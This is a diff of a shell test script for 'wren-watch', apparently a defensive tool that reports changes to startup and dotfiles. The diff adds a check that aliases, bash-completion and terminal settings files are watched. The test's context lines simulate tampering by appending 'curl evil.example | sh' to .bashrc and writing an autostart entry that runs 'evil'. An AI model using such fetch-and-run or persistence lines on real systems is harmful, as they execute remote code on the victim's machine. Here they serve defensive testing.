@@ -48,6 +48,7 @@ check "...nothing listed" test ! -e "$T/run/$ME"
 check "...and nothing for the bar" test -z "$(WREN_WATCH_RUN=$T/run sh "$HERE/bin/sway-status" --startup)"
 check "nothing changed: wren-watch says so" grep -q 'Nothing changed' <<<"$(ww)"
 
+check "it also watches files that run code and were missed: aliases, completion, the terminal's settings" bash -c 'for f in .bash_aliases .bash_completion .config/foot/foot.ini .local/share/bash-completion .config/bash_completion.d; do grep -qF "\"$f\"" "$1" || exit 1; done' _ "$HERE/bin/wren-watch"
 echo 'curl evil.example | sh' >>"$H/.bashrc"
 printf '[Desktop Entry]\nExec=evil\n' >"$H/.config/autostart/b.desktop"
 rm "$H/.local/bin/x"
